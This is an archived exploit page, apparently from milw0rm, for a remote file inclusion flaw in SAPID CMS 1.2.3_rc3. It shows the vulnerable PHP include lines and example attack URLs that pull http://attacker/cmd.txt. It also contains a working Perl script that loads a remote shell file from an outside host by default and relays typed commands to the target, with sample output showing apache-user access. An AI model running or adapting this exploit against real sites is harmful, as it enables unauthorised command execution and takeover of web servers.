<html><head><title>SAPID CMS <= 1.2.3_rc3 (rootpath) Remote Code Execution Exploit</title></head><pre>#########################################################################
# Title: SAPID CMS Multiple remote Command Execution Vulnerabilities
#
# Author: Simo64 &lt;simo64_at_morx_org&gt;
# 
# Discovered: 06 Aout 2006
# 
# Published : 08 Aout 2006
# 
# MorX Security Research Team
# 
# http://www.morx.org
# 
# Vendor : SAPID CMS
#
# Version : 123 rc3 ()
# 
# Website : http://sapid.sourceforge.net
# 
# Severity: Critical
# 
# Details: 
# 
# 
# [+] Remote File Inclusion
# 
# 1) vulnerable code in usr/extensions/get_infochannel.inc.php lines( 8 - 9 )
# 
# if(!defined(&quot;common_extfunctions&quot;)) { define(&quot;common_extfunctions&quot;, &quot;loaded&quot;);
# include($root_path.&quot;usr/system/common_extfunctions.inc.php&quot;); }
#
# 2) vulnerable code in usr/extensions/get_tree.inc.php lines( 9 - 10 )
#
# if(!defined(&quot;common_extfunctions&quot;)) { define(&quot;common_extfunctions&quot;, &quot;loaded&quot;);
# include($GLOBALS[&quot;root_path&quot;].&quot;usr/system/common_extfunctions.inc.php&quot;); }
#
# $root_path , $GLOBALS[&quot;root_path&quot;] variable are not sanitized ,before it can be used to include files
# 
# [-] Exploit : 
# 
# http://localhost/usr/extensions/get_infochannel.inc.php?root_path=http://attacker/cmd.txt?cmd=id;pwd
# 
# http://localhost/usr/extensions/get_tree.inc.php?GLOBALS[&quot;root_path&quot;]=http://attacker/cmd.txt?cmd=id;pwd
#
#======================================
# Poc Remote Command Execution Exploit:
#======================================
#
# http://www.morx.org/sapid.txt
#
# C:\&gt;perl sapid.pl http://127.0.0.1
#
# ===============================================================
# =  SAPID 123_rc3 (rootpath) Remote Command Execution Exploit  =
# ===============================================================
# =       MorX Security Research Team - www.morx.org            =
# =       Coded by Simo64 - simo64@www.morx.org                 =
# ===============================================================

# simo64@morx.org :~$ id; ls
# uid=48(apache) gid=48(apache) groups=48(apache)
# get_calendar.inc.php
# get_filter_list.inc.php
# get_gb_records.inc.php
# get_infochannelfilter.inc.php
# get_infochannel.inc.php
# get_rss.inc.php
# get_searchresults.inc.php
# get_survey.inc.php
# get_track.inc.php
# get_tree.inc.php
# soap_call.inc.php
# simo64@morx.org :~$ exit

# Enjoy !
#
#!/usr/bin/perl


use LWP::Simple;

print &quot;\n===============================================================\n&quot;;
print &quot;=  SAPID 123_rc3 (rootpath) Remote Command Execution Exploit  =\n&quot;;
print &quot;===============================================================\n&quot;;
print &quot;=       MorX Security Research Team - www.morx.org            =\n&quot;;
print &quot;=       Coded by Simo64 - simo64\@www.morx.org                 =\n&quot;; 
print &quot;===============================================================\n\n&quot;;

my $targ,$rsh,$path,$con,$cmd,$data,$getit ;

$targ = $ARGV[0];
$rsh  = $ARGV[1];

if(!$ARGV[1]) {$rsh = &quot;http://zerostag.free.fr/sh.txt&quot;;}

if(!@ARGV) { &amp;usage;exit(0);}

	$targ = $ARGV[0];
	

	
	chomp($targ);
    chomp($rsh);
    
	$path = $targ.&quot;/usr/extensions/get_infochannel.inc.php&quot;;
	$con  = get($path) || die &quot;[-]Cannot connect to Host&quot;; 

sub usage(){
	print &quot;Usage    : perl $0 host/path [OPTION]\n\n&quot;;
	print &quot;Exemples : perl $0 http://127.0.0.1\n&quot;;
	print &quot;           perl $0 http://127.0.0.1 http://yoursite/yourcmd.txt\n\n&quot;;
	}

while ()  
{  
	 print &quot;simo64\@morx.org :~\$ &quot;;
	 chomp($cmd=&lt;STDIN&gt;);
     if ($cmd eq &quot;exit&quot;) { print &quot;\nEnjoy !\n\n&quot;;exit(0);}
     $getit = $path.&quot;?root_path=&quot;.$rsh.&quot;?&amp;cmd=&quot;.$cmd;
     $data=get($getit);
     if($cmd eq &quot;&quot;){ print &quot;Please enter command !\n&quot;; }
     else{ print $data ;}
}

# milw0rm.com [2006-08-10]</pre></html>